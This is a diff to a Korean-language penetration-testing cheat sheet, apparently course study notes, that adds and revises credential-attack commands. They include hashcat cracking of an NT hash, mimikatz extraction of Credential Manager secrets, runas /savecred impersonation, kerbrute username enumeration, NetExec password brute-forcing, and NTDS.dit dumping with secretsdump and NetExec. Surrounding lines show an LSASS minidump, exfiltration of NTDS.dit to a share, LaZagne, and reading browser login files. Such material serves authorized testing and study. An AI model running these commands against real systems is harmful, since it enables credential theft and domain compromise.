@@ -241,7 +241,7 @@ reg.exe save hklm\system C:\system.save
 reg.exe save hklm\security C:\security.save
 ```
 
-### Impacket's smbserver.py로 공유 생성
+#### Impacket's smbserver.py로 공유 생성
 - smb2support를 실행, 공유 이름(`CompData`), 저장할 공격 호스트의 디렉토리(`/home/ltnbob/Documents`) 지정<br/>
 ```$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/```
 
@@ -277,8 +277,34 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 
 ### Pypykatz를 사용하여 LSASS 프로세스 덤프
 ```pypykatz lsa minidump ./lsass.dmp```
+
+### Cracking the NT Hash with Hashcat
+```sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt```
+
+## Attacking Windows Credential Manager
+### cmdkey로 자격 증명 열거
+```C:\Users\sadams>cmdkey /list```
+- SRV01\mcharles 사용자 가장 : ```C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd```
+
+### Mimikatz를 사용하여 자격 증명 추출
+```
+C:\Users\Administrator\Desktop> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::credman
+```
+- 저장된 자격 증명을 열거하고 추출하는 데 사용할 수 있는 다른 도구 : [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) , [LaZagne](https://github.com/AlessandroZ/LaZagne) , [DonPAPI](https://github.com/login-securite/DonPAPI) 등
+
 <br/><br/>
-## Attacking NTDS.dit
+## Attacking Active Directory & NTDS.dit
+- 사용자 이름 목록 수동 생성 : [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)<br/>
+```$ ./username-anarchy -i /home/ltnbob/names.txt```
+
+### Kerbrute를 사용하여 유효한 사용자 이름 열거
+```$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt```
+
+### brute-force attack with NetExec
+```netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt```
+
 ### Evil-WinRM, Vssadmin를 이용한 NTDS.dit 복사
 ```
 *Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
@@ -286,8 +312,11 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 *Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\192.168.1.1\Share
 ```
 
-### Crackmapexec를 이용한 NTDS.dit 덤프
-```crackmapexec smb 192.168.1.1 --local-auth -u <user> -p <password> --ntds```
+### NTDS.dit에서 해시 추출
+```$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL```
+
+### NetExec를 이용한 NTDS.dit 덤프
+```$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil```
 
 <br/><br/>
 ## 자격증명 검색
@@ -341,6 +370,7 @@ rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 
 ### Memory - LaZagne
 ```python2.7 laZagne.py all```
+
 <br/><br/>
 ## Browsers 검색
 
@@ -355,6 +385,7 @@ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 
 ### Browsers - LaZagne
 ```python3 laZagne.py browsers```
+
 <br/><br/>
 ## Shadow 파일
 - `$<type>$<salt>$<hashed>`
@@ -368,6 +399,7 @@ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 
 ### 저장된 오래된 비밀번호 확인
 ```cat /etc/security/opasswd```
+
 <br/><br/>
 ## Shadow 파일
 
